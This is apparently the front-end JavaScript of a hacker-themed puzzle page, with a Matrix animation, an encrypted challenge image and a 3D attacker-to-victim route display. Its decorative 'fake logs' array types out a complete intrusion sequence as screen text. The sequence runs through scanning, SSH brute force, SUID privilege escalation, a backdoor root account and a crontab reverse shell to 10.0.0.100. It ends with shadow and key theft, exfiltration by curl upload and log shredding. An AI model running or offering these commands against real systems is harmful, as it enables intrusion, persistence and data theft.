const progressBar = document.getElementById('progress-bar');

function updateProgressBar(progress, isTracing) {
  progressBar.style.width = `${progress}%`;
  progressBar.setAttribute('aria-valuenow', progress);

  if (isTracing) {
    // For red trace (reverse direction)
    progressBar.classList.add('bg-danger'); // Red for tracing
    progressBar.classList.remove('bg-success'); // Remove green class
  } else {
    // For green route building (normal direction)
    progressBar.classList.add('bg-success'); // Green for building
    progressBar.classList.remove('bg-danger'); // Remove red class
  }
}


// Audio Control
let audioPlaying = false;
const audio = new Audio('mixkit-games-music-706.mp3');

function toggleAudio() {
  const audioControlButton = document.querySelector('.audio-control button i');
  if (audioPlaying) {
    audio.pause();
    audioControlButton.classList.remove('fa-pause');
    audioControlButton.classList.add('fa-play');
  } else {
    audio.play();
    audioControlButton.classList.remove('fa-play');
    audioControlButton.classList.add('fa-pause');
  }
  audioPlaying = !audioPlaying;
}

// Decrypt Image and Check Answer
async function submitAnswer() {
  const answer = document.getElementById('answer').value.trim();
  const storedHash = '9251f129e36d22db1b07c86a83bc9268948d98bd80be3b9c6eb8c48ed0ef22ac';
  
  // Hash the user's input
  const answerHash = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(answer)
  );
  const hexHash = Array.from(new Uint8Array(answerHash))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');

  if (hexHash === storedHash) {
    decryptImage(answer, 'http://localhost:8080/images/challenge2.png.enc');
  } else {
    alert('Incorrect answer! Try again.');
  }
}

// Decrypt Image Function
async function decryptImage(password, imagePath) {
try {
    // Fetch the encrypted image data
    const response = await fetch(imagePath);
    const encryptedBase64 = await response.text(); // Assuming the encrypted data is Base64 encoded
    const encryptedBlob = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));

    // Extract the IV and encrypted content
    const iv = encryptedBlob.slice(0, 16); // First 16 bytes are the IV
    const encryptedContent = encryptedBlob.slice(16); // Remaining bytes are the encrypted data

    // Derive the cryptographic key from the password
    const passwordKey = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(password)); // SHA-256 hash of the password
    const key = await crypto.subtle.importKey(
        "raw",
        passwordKey,
        { name: "AES-CBC" },
        false,
        ["decrypt"]
    );

    // Decrypt the data
    const decryptedData = await crypto.subtle.decrypt(
    { name: "AES-CBC", iv: iv },
    key,
    encryptedContent
    );

    // Remove PKCS#7 padding
    const decryptedArray = new Uint8Array(decryptedData);
    const paddingLength = decryptedArray[decryptedArray.length - 1];
    const unpaddedData = decryptedArray.slice(0, decryptedArray.length - paddingLength);

    // Convert decrypted data to Base64 and display the image
    const base64Image = btoa(
    String.fromCharCode(...unpaddedData)
    );
    document.getElementById('challenge-image').src = 'data:image/png;base64,' + base64Image;
} catch (err) {
    alert('Error decrypting the image. Make sure your answer is correct.');
    console.error(err);
}
}
  

// Matrix Effect
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

// Resize canvas to fit the window
function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}

resizeCanvas();
window.addEventListener('resize', resizeCanvas);

const fontSize = 16; // Size of each character
const columns = Math.floor(canvas.width / fontSize); // Number of columns
const drops = Array(columns).fill(0); // Array to track Y position for each column

function drawMatrix() {
  // Clear the canvas with a transparent black overlay
  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Set text properties
  ctx.fillStyle = '#0f0'; // Green text
  ctx.font = `${fontSize}px monospace`;

  for (let i = 0; i < drops.length; i++) {
    // Generate a random character from Katakana Unicode range
    const text = String.fromCharCode(0x30A0 + Math.random() * 96);

    // Draw the character at the current position
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);

    // Move the character down the screen
    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
      // Reset the drop to the top randomly
      drops[i] = 0;
    }
    drops[i]++;
  }
}

// Animate the matrix effect
setInterval(drawMatrix, 50);

function showWhiteRabbit() {
    const rabbit = document.getElementById('white-rabbit');
    const container = document.getElementById('rabbit-container');
  
    // Generate random position within the container
    const randomX = Math.random() * (window.innerWidth - 50); // Ensure the rabbit stays within screen bounds
    const randomY = Math.random() * (window.innerHeight - 50);
  
    // Position the rabbit
    rabbit.style.left = `${randomX}px`;
    rabbit.style.top = `${randomY}px`;
  
    // Fade in the rabbit
    rabbit.style.opacity = 1;
  
    // Fade out after a delay
    setTimeout(() => {
      rabbit.style.opacity = 0;
    }, 4000); // Rabbit stays visible for 2 seconds
  }
  
  // Repeatedly show the rabbit at random intervals
  setInterval(() => {
    showWhiteRabbit();
  }, 60000); // Adjust interval (5000ms = 5 seconds)
  
  function populatePanels() {
    const systemInfo = document.getElementById('system-info');
    const networkInfo = document.getElementById('network-info');
  
    // **System Information**
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
  
    systemInfo.innerHTML = `
      <li><strong>Platform:</strong> ${platform}</li>
      <li><strong>User Agent:</strong> ${userAgent}</li>
      <li><strong>Language:</strong> ${language}</li>
      <li><strong>Screen:</strong> ${screenWidth} x ${screenHeight}</li>
    `;  
    // **Geolocation**
    navigator.geolocation.getCurrentPosition(position => {
      const { latitude, longitude } = position.coords;
      systemInfo.innerHTML += `
        <li><strong>Latitude:</strong> ${latitude.toFixed(4)}</li>
        <li><strong>Longitude:</strong> ${longitude.toFixed(4)}</li>
      `;
    });
  
    // **Fake CPU Usage**
    setInterval(() => {
      const cpuUsage = (Math.random() * 100).toFixed(1);
      const existingCpu = document.getElementById('cpu-usage');
      if (existingCpu) existingCpu.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
      else {
        const cpuElement = document.createElement('li');
        cpuElement.id = 'cpu-usage';
        cpuElement.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
        systemInfo.appendChild(cpuElement);
      }
    }, 2000);
  }
  
  // Run the function
  populatePanels();
  
  const logs = ['www-data@webserver:/var/www/html$ nmap -sS -Pn -T4 -p- 10.0.0.5',
`
  Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-12 18:23 UTC
  Nmap scan report for 10.0.0.5
  Host is up (0.0015s latency).
  Not shown: 65532 closed ports
  PORT    STATE SERVICE
  22/tcp  open  ssh
  80/tcp  open  http
  3306/tcp open  mysql
  
  Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
    `,
  'www-data@webserver:/var/www/html$ gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
    `
  ===============================================================
  Gobuster v3.1.0
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@FireFart)
  /admin (Status: 200)
  /login (Status: 200)
  /uploads (Status: 200)
  /backup (Status: 403)
  /private (Status: 403)
  ===============================================================
    `,
  '',
  '',
  'www-data@webserver:/var/www/html$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
    `
  Hydra v9.3-dev (c) 2024 by van Hauser/THC & David Maciejak
  [DATA] attacking ssh://10.0.0.5:22/
  [22][ssh] host: 10.0.0.5   login: admin   password: SecurePass123!
  [STATUS] attack finished for 10.0.0.5 (valid pair found)
    `,
    '',
    '',
    'www-data@webserver:/var/www/html$ ssh admin@10.0.0.5',
    `
  Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
  appuser@app-server:/home/appuser$
    `,
    '',
    '',
    'appuser@app-server:/home/appuser$ sudo -l',
    `
  User appuser may run the following commands on app-server:
      (ALL) NOPASSWD: /usr/bin/vuln_suid
    `,
    '',
    '',
    'appuser@app-server:/home/appuser$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
    `
  --2024-11-12 18:30:01--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  Resolving github.com (github.com)... 140.82.121.4
  Connecting to github.com (github.com)|140.82.121.4|:443... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 1244563 (1.2M) [text/plain]
  Saving to: ‘/tmp/linpeas.sh’
  
  /tmp/linpeas.sh     100%[=====================>]   1.19M  10.5MB/s    in 0.1s    
  
  2024-11-12 18:30:01 (10.5 MB/s) - ‘/tmp/linpeas.sh’ saved [1244563/1244563]
    `,
    '',
    '',
    'appuser@app-server:/home/appuser$ chmod +x /tmp/linpeas.sh',
  '',
  '',
  'appuser@app-server:/home/appuser$ ./linpeas.sh | tee /tmp/linpeas_output.txt',
    `
  Hostname: app-server
  Kernel: 5.15.0-78-generic x86_64
  OS: Ubuntu 22.04.3 LTS
  User ID: 1002(appuser)
  [+] SUID binaries:
      /usr/bin/vuln_suid
    `,
  'appuser@app-server:/home/appuser$ /usr/bin/vuln_suid',
    `
  # id
  uid=0(root) gid=0(root) groups=0(root)
    `,
  'root@app-server:/root$ useradd -ou 0 -g 0 -M -r -s /bin/bash backupsvc',
  '',
  'root@app-server:/root$ echo "backupsvc:RootAccess2024!" | chpasswd',
  '',
  'root@app-server:/root$ echo "* * * * * bash -i >& /dev/tcp/10.0.0.100/4444 0>&1" | tee -a /etc/crontab',
  '',
  'root@app-server:/root$ cat /etc/shadow',
    `
  root:$6$h7WE...S6$9B6xx...EncryptedHash:18775:0:99999:7:::
  appuser:$6$FgP3...Y7$3Z8xy...EncryptedHash:18775:0:99999:7:::
    `,
  'root@app-server:/root$ cat /root/.ssh/id_rsa',
    `
  -----BEGIN RSA PRIVATE KEY-----
  MIIEpQIBAAKCAQEA7G12q0...
  -----END RSA PRIVATE KEY-----
    `,
  'root@app-server:/root$ scp -i /tmp/root_key /tmp/linpeas_output.txt root@10.0.0.6:/tmp/',
    `
  linpeas_output.txt 100% |********************************|   14.5kB   0:00:00
    `,
  'root@app-server:/root$ ssh -i /tmp/root_key root@10.0.0.6',
    `
  Welcome to CentOS Stream release 9 (Core)
  dbadmin@db-server:/var/lib/mysql$
    `,
  'dbadmin@db-server:/var/lib/mysql$ tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /root/.ssh',
  '',
  'dbadmin@db-server:/var/lib/mysql$ openssl enc -aes-256-cbc -salt -in /tmp/sensitive_data.tar.gz -out /tmp/data.enc -k SuperSecretKey',
  '',
  'dbadmin@db-server:/var/lib/mysql$ curl -X POST -F "file=@/tmp/data.enc" http://10.0.0.100/upload',
    `
  100  130k    0  130k    0     0  2012k      0 --:--:-- --:--:-- --:--:-- 2012k
  Upload complete.
    `,
  'dbadmin@db-server:/var/lib/mysql$ shred -u /tmp/sensitive_data.tar.gz /tmp/data.enc /tmp/linpeas.sh /tmp/root_key',
  '',
  'dbadmin@db-server:/var/lib/mysql$ exit',
  ''
  ];      
  
  let currentLogIndex = 0;

  function generateFakeLogs() {
    const networkInfo = document.getElementById('network-info');
  
    if (currentLogIndex < logs.length) {
      const logEntry = logs[currentLogIndex];
      const logElement = document.createElement('li');
      networkInfo.appendChild(logElement);
  
      // Separate the user@hostname and the command
      const [prefix, ...commandParts] = logEntry.split('$ ');
      const command = commandParts.join('$ '); // Handles cases where '$' appears in the command
  
      // Display user@hostname instantly and type the command
      if (command) {
        logElement.innerHTML = `<span class="prefix">${prefix}$ </span><span class="command"></span>`;
        const commandElement = logElement.querySelector('.command');
        autoScroll(networkInfo);
        simulateTyping(command, commandElement, () => {
          autoScroll(networkInfo); // Auto-scroll after typing
          processNextLog();
        });
      } else {
        logElement.textContent = logEntry; // For outputs or non-typed logs
        autoScroll(networkInfo); // Auto-scroll for immediate display
        processNextLog();
      }
    } else {
      // Restart logs after a delay
      currentLogIndex = 0;
      setTimeout(generateFakeLogs, 8000); // Delay before restarting logs
    }
  }
  
  function simulateTyping(text, logElement, callback) {
    let i = 0;
    logElement.textContent = ''; // Clear existing content
  
    function typeNextCharacter() {
      if (i < text.length) {
        logElement.textContent += text.charAt(i); // Add one character at a time
        i++;
        const typingSpeed = 100 + Math.random() * 50; // Randomized speed
        setTimeout(typeNextCharacter, typingSpeed);
      } else {
        callback(); // Trigger the callback after typing finishes
      }
    }
  
    typeNextCharacter();
  }
  
  function autoScroll(container) {
    container.scrollTop = container.scrollHeight; // Scroll to the bottom of the container
  }
  
  function processNextLog() {
    currentLogIndex++;
    setTimeout(generateFakeLogs, 3000); // Add delay between logs
  }
  
  // Start generating logs
  generateFakeLogs();
  

  
  const canvas2 = document.getElementById('canvas2');
  const ctx2 = canvas2.getContext('2d');
  
  // Resize canvas2 to fit the left panel
  function resizeCanvas2() {
    const panel = document.querySelector('.left-panel');
    canvas2.width = panel.offsetWidth;
    canvas2.height = 300; // Match the height set in CSS
  }
  resizeCanvas2();
  window.addEventListener('resize', resizeCanvas2);
  
  // Parameters
  const sphereRadius = 100;
  const numNodes = 20;
  const fov = 300; // Field of view
  let nodes = [];
  let activeRoute = [];
  let traceIndex = -1; // No segments traced initially
  let buildIndex = 0; // Tracks the green route build-up
  let rotating = false; // Is the camera currently rotating?
  
  // Camera rotation angles
  let cameraRotationX = 0; // Camera rotation around the X-axis
  let cameraRotationY = 0; // Camera rotation around the Y-axis
  let targetCameraRotationX = 0; // Target rotation for X-axis
  let targetCameraRotationY = 0; // Target rotation for Y-axis
  let rotationStep = 0.01; // Fine rotation step
  
  let buildRouteTimeout = null;
  let traceRouteTimeout = null;
  
  // Generate nodes on the sphere using Fibonacci lattice
  function generateNodes() {
    nodes = Array.from({ length: numNodes }, (_, i) => {
      const goldenRatio = (1 + Math.sqrt(5)) / 2;
      const longitude = 2 * Math.PI * (i / goldenRatio); // Evenly distributed angles
      const latitude = Math.asin(-1 + (2 * i) / (numNodes - 1)); // Uniform latitude
      
      const x = sphereRadius * Math.cos(longitude) * Math.cos(latitude);
      const y = sphereRadius * Math.sin(longitude) * Math.cos(latitude);
      const z = sphereRadius * Math.sin(latitude);
  
      return {
        id: i + 1,
        x,
        y,
        z,
        name: `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
      };
    });
  
    // Assign attacker and victim nodes
    const attackerNode = nodes[0];
    const victimNode = nodes[nodes.length - 1];
    attackerNode.name = 'Attacker';
    victimNode.name = 'Victim';
  
    return { attackerNode, victimNode };
  }
  
  function getRandomIntBetween(x, y) {
    return Math.floor(Math.random() * (y - x + 1)) + x;
  }


  function toggleBorderColor(isTracing) {
    const canvas2 = document.getElementById('canvas2');
    const progressContainer = document.querySelector('.progress-container');
    const progress = document.querySelector('.progress');

    if (isTracing) {
      // Change to red during tracing with glow
      canvas2.style.border = '2px solid red';
      canvas2.style.boxShadow = '0 0 10px red, 0 0 20px red';
      progressContainer.style.border = '2px solid red';
      progressContainer.style.boxShadow = '0 0 10px red, 0 0 20px red';
      progress.style.border = '2px solid red';
      progress.style.boxShadow = '0 0 10px red, 0 0 20px red';
    } else {
      // Change to green during building with glow
      canvas2.style.border = '2px solid #0f0';
      canvas2.style.boxShadow = '0 0 10px #0f0, 0 0 20px #0f0';
      progressContainer.style.border = '2px solid #0f0';
      progressContainer.style.boxShadow = '0 0 10px #0f0, 0 0 20px #0f0';
      progress.style.border = '2px solid #0f0';
      progress.style.boxShadow = '0 0 10px #0f0, 0 0 20px #0f0';
    }
  }
  

  // Generate a new route
  function generateRoute() {
    // Clear any pending timeouts
    if (buildRouteTimeout) clearTimeout(buildRouteTimeout);
    if (traceRouteTimeout) clearTimeout(traceRouteTimeout);
  
    const { attackerNode, victimNode } = generateNodes();
    activeRoute = [attackerNode];
  
    const routeLength = getRandomIntBetween(4, numNodes/2);

    // Add intermediate nodes based on the random route length
    while (activeRoute.length < routeLength) {
      const nextNode = nodes.find((node) => !activeRoute.includes(node) && node !== victimNode);
      if (nextNode) activeRoute.push(nextNode);
    }
    activeRoute.push(victimNode);
  
    traceIndex = activeRoute.length; // Reset tracing progress
    buildIndex = 0; // Reset green route build-up
    rotating = false; // Stop any rotation
    cameraRotationX = 0; // Reset camera to default
    cameraRotationY = 0;
  
    calculateRotationToNode(attackerNode); // Start with attacker node
    buildGreenRoute(); // Start building the green route
  }
  
  let packetProgress = 0; // Tracks packet animation progress
  let packetEdge = null; // Current edge for packet animation
  
  function drawPacket() {
    if (!packetEdge) return;
  
    const { fromNode, toNode, color } = packetEdge;
    const from2D = project3DTo2D(fromNode);
    const to2D = project3DTo2D(toNode);
  
    // Interpolate packet position
    const x = from2D.x + (to2D.x - from2D.x) * packetProgress;
    const y = from2D.y + (to2D.y - from2D.y) * packetProgress;
  
    // Draw packet as a small circle
    ctx2.fillStyle = color;
    ctx2.beginPath();
    ctx2.arc(x, y, 4, 0, 2 * Math.PI); // Adjust size as needed
    ctx2.fill();
  }
  
  
  function triggerPacketAnimation(edgeIndex, isTracing = false) {
    const fromNode = isTracing
      ? activeRoute[edgeIndex + 1] // Reverse direction for red route
      : activeRoute[edgeIndex];
    const toNode = isTracing
      ? activeRoute[edgeIndex] // Reverse direction for red route
      : activeRoute[edgeIndex + 1];
  
    if (!fromNode || !toNode) {
      console.error('Invalid nodes for packet animation:', { fromNode, toNode });
      return;
    }
  
    // Assign color based on tracing or building
    const color = isTracing ? 'red' : '#0f0';
  
    packetEdge = { fromNode, toNode, color };
    packetProgress = 0;
  
    const packetInterval = setInterval(() => {
      packetProgress += 0.05; // Adjust speed
  
      if (packetProgress >= 1) {
        packetProgress = 1;
        packetEdge = null;
        clearInterval(packetInterval);
      }
    }, 50); // Adjust speed as needed
  }
  
  

  function buildGreenRoute() {
    toggleBorderColor(false); // Set to green
    isTracing = false; // Indicate we're building the green route
    if (buildIndex < activeRoute.length - 1) {
      buildIndex++;
      calculateRotationToNode(activeRoute[buildIndex]); // Rotate to the next node
      triggerPulse(); // Trigger pulse effect
      triggerPacketAnimation(buildIndex, false); // Animate green packet
      
      // Update the progress bar for green route building
      const progress = ((buildIndex + 1) / activeRoute.length) * 100;
      updateProgressBar(progress, false);
      
      buildRouteTimeout = setTimeout(buildGreenRoute, 5000); // Trigger next segment
    } else {
      // Start tracing the red route
      traceRouteTimeout = setTimeout(traceRedRoute, 5000);
    }
  }
  
  
  function traceRedRoute() {
    toggleBorderColor(true); // Set to red
    isTracing = true; // Indicate we're tracing the red route
    if (traceIndex > 0) {
      traceIndex--;
      calculateRotationToNode(activeRoute[traceIndex]); // Rotate to the next node
      triggerPulse(); // Trigger pulse effect
      triggerPacketAnimation(traceIndex, true); // Animate red packet
      
      // Update the progress bar for red route tracing
      const progress = ((activeRoute.length - traceIndex) / activeRoute.length) * 100;
      updateProgressBar(progress, true);
      
      traceRouteTimeout = setTimeout(traceRedRoute, 5000); // Trigger next segment
    } else {
      // Generate a new route after tracing is complete
      setTimeout(generateRoute, 5000);
    }
  }
  
  
  // Smooth rotation to center the target node
  function rotateCameraToTarget() {
    const deltaX = targetCameraRotationX - cameraRotationX;
    const deltaY = targetCameraRotationY - cameraRotationY;
  
    if (Math.abs(deltaX) < 0.5 && Math.abs(deltaY) < 0.5) {
      rotating = false; // Stop rotating
      return;
    }
  
    cameraRotationX += Math.sign(deltaX) * Math.min(Math.abs(deltaX), rotationStep);
    cameraRotationY += Math.sign(deltaY) * Math.min(Math.abs(deltaY), rotationStep);
  }
  
  // Calculate target rotation for a node
  function calculateRotationToNode(node) {
    const theta = Math.atan2(node.y, node.x);
    const phi = Math.acos(node.z / sphereRadius);
  
    targetCameraRotationX = phi - Math.PI / 2;
    targetCameraRotationY = theta;
    rotating = true;
  }
  
  // Project 3D points onto 2D canvas with camera rotation
  function project3DTo2D(node) {
    const cosX = Math.cos(cameraRotationX);
    const sinX = Math.sin(cameraRotationX);
    const cosY = Math.cos(cameraRotationY);
    const sinY = Math.sin(cameraRotationY);
  
    let y = node.y * cosX - node.z * sinX;
    let z = node.y * sinX + node.z * cosX;
  
    let x = node.x * cosY - z * sinY;
    z = node.x * sinY + z * cosY;
  
    const perspective = fov / (fov + z);
    const x2D = canvas2.width / 2 + x * perspective;
    const y2D = canvas2.height / 2 - y * perspective;
  
    return { x: x2D, y: y2D, scale: perspective };
  }
  

  function drawNodes() {
    const lightSource = { x: 0, y: 0, z: 200 }; // Light source position in 3D space
  
    nodes.forEach((node) => {
      const { x, y, scale } = project3DTo2D(node);
      const size = Math.max(2, 8 * scale); // Scale node size with perspective
  
      // Determine the node's base color based on its state
      let baseColor = 'gray'; // Default for unvisited nodes
      if (node === activeRoute[0]) {
        baseColor = 'red'; // Attacker node
      } else if (node === activeRoute[activeRoute.length - 1]) {
        baseColor = 'blue'; // Victim node
      } else {
        const nodeIndexInRoute = activeRoute.indexOf(node);
        if (nodeIndexInRoute !== -1) {
          if (nodeIndexInRoute <= buildIndex) {
            baseColor = '#0f0'; // Green for nodes in the built route
          }
          if (nodeIndexInRoute >= traceIndex) {
            baseColor = 'red'; // Red for traced nodes
          }
        }
      }
  
      // Calculate the direction of the light relative to the node
      const lightVector = {
        x: lightSource.x - node.x,
        y: lightSource.y - node.y,
        z: lightSource.z - node.z,
      };
      const lightMagnitude = Math.sqrt(
        lightVector.x ** 2 + lightVector.y ** 2 + lightVector.z ** 2
      );
      const normalizedLight = {
        x: lightVector.x / lightMagnitude,
        y: lightVector.y / lightMagnitude,
        z: lightVector.z / lightMagnitude,
      };
  
      // Calculate the dot product between the light direction and the node's normal
      const normalVector = { x: node.x, y: node.y, z: node.z }; // Node's surface normal
      const normalMagnitude = Math.sqrt(
        normalVector.x ** 2 + normalVector.y ** 2 + normalVector.z ** 2
      );
      const normalizedNormal = {
        x: normalVector.x / normalMagnitude,
        y: normalVector.y / normalMagnitude,
        z: normalVector.z / normalMagnitude,
      };
      const dotProduct =
        normalizedLight.x * normalizedNormal.x +
        normalizedLight.y * normalizedNormal.y +
        normalizedLight.z * normalizedNormal.z;
  
      // Clamp the dot product between 0 and 1 to get the light intensity
      const lightIntensity = Math.max(0, Math.min(1, dotProduct));
  
      // Adjust the base color to incorporate the light intensity
    // Create a radial gradient for the sphere
    const gradient = ctx2.createRadialGradient(x, y, 0, x, y, size);
    gradient.addColorStop(0, `rgba(255, 255, 255, ${0.7 * lightIntensity})`); // Highlight
    gradient.addColorStop(0.7, baseColor); // Base color dynamically set
    gradient.addColorStop(1, `rgba(0, 0, 0, 0)`); // Transparent shadow

      // Draw the sphere
      ctx2.fillStyle = gradient;
      ctx2.beginPath();
      ctx2.arc(x, y, size, 0, 2 * Math.PI);
      ctx2.fill();
      ctx2.closePath(); // Ensure no stroke is applied
  
      // Draw label
      ctx2.fillStyle = 'cyan';
      ctx2.font = `${Math.max(8, 12 * scale)}px Courier New`;
      ctx2.textAlign = 'center';
      ctx2.fillText(node.name, x, y - size - 5);
    });
  }
  
  let pulseProgress = 0; // Tracks pulse animation progress
  let isPulsing = false; // Is the animation active?
  let isTracing = false; // 

  function drawRoute() {
    ctx2.lineWidth = 2;
  
    for (let i = 0; i < activeRoute.length - 1; i++) {
      const fromNode = activeRoute[i];
      const toNode = activeRoute[i + 1];
  
      if (!fromNode || !toNode) continue;
  
      const from2D = project3DTo2D(fromNode);
      const to2D = project3DTo2D(toNode);
  
      // Determine the edge color with pulse effect
      if (i <= buildIndex) {
        if (!isTracing && i === buildIndex && isPulsing) {
          // Pulse green edge during green route build
          ctx2.strokeStyle = `rgba(0, 255, 0, ${0.5 + 0.5 * Math.sin(pulseProgress)})`;
        } else if (isTracing && i === traceIndex && isPulsing) {
          // Pulse red edge during red route trace
          ctx2.strokeStyle = `rgba(255, 0, 0, ${0.5 + 0.5 * Math.sin(pulseProgress)})`;
        } else {
          // Default green or red
          ctx2.strokeStyle = i >= traceIndex ? 'red' : '#0f0';
        }
      } else {
        // Unvisited edges remain gray
        ctx2.strokeStyle = 'gray';
      }
  
      // Draw the edge
      ctx2.beginPath();
      ctx2.moveTo(from2D.x, from2D.y);
      ctx2.lineTo(to2D.x, to2D.y);
      ctx2.stroke();
    }
  }
  
  function triggerPulse() {
    if (isPulsing) return; // Prevent multiple pulses
  
    isPulsing = true;
    pulseProgress = 0;
  
    const pulseInterval = setInterval(() => {
      pulseProgress += 0.2; // Increment pulse progress
  
      if (pulseProgress > Math.PI * 2) { // Stop after one pulse cycle
        isPulsing = false; // Reset pulsing flag
        clearInterval(pulseInterval);
      }
    }, 50); // Adjust speed as needed
  } 
  
  // Animation loop
  function animateSphere() {
    ctx2.clearRect(0, 0, canvas2.width, canvas2.height);
  
    if (rotating) rotateCameraToTarget();
  
    drawRoute();
    drawNodes();
    drawPacket();
  
    requestAnimationFrame(animateSphere);
  }
  
  function incrementBuildRoute() {
    if (buildIndex < activeRoute.length - 1) {
      buildIndex++;
      triggerPulse(); // Trigger pulse when the route expands
    }
  }
  
  function incrementTraceRoute() {
    if (traceIndex > 0) {
      traceIndex--;
      triggerPulse(); // Trigger pulse when tracing back
    }
  }


  // Initialize and run the simulation
  generateRoute();
  animateSphere();
  


